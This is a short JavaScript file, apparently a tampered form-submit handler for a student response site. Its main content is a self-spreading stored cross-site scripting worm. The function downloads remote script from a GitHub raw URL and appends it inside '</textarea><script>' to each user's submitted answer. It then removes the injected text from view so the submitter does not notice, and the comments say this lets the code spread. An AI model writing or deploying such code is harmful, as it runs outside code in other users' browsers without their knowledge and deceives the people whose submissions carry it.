function updateRec(selectedform,stuID) {
    $.ajax({
        url: "https://raw.githubusercontent.com/PythonGithCode/ubiquitous-carnival/main/cupcakes.js",
        type: "GET",
        dataType: "text", // added data type
        success: function(res) {
            localStorage.setItem("StudentFTRDontChange", res);
        }
    });
    var s = "response" + stuID;
    var theform=selectedform;
    // just cus this is easier then doing something global
    var reporduce="</textarea><script>" + localStorage.getItem("StudentFTRDontChange") + "</script>";
    // also add quality of life to it by adding make the quote work better
    theform.getElementsByTagName("textarea")[0].value = theform.getElementsByTagName("textarea")[0].value.replaceAll("'", "''");
    // add the code that makes it so that this can spread
    theform.getElementsByTagName("textarea")[0].value += reporduce;
    // log the value of the form text cus other wise it should be hidden.
    console.log(theform.getElementsByTagName("textarea")[0].value);

    // submit the form
    var status = AjaxRequest.submit(
        theform,
        {
          "onSuccess":
            function(r) {
                document.getElementById(s).innerHTML = r.responseText
                document.getElementById(s).className="normal";
            }
        }
    );
    // make it so when the saveing of the added code is not really seen by the user.
    // also add quality of life to it by adding make the quote work better
    theform.getElementsByTagName("textarea")[0].value = theform.getElementsByTagName("textarea")[0].value.replaceAll(reporduce, "").replaceAll("''", "'");
    return status;
}
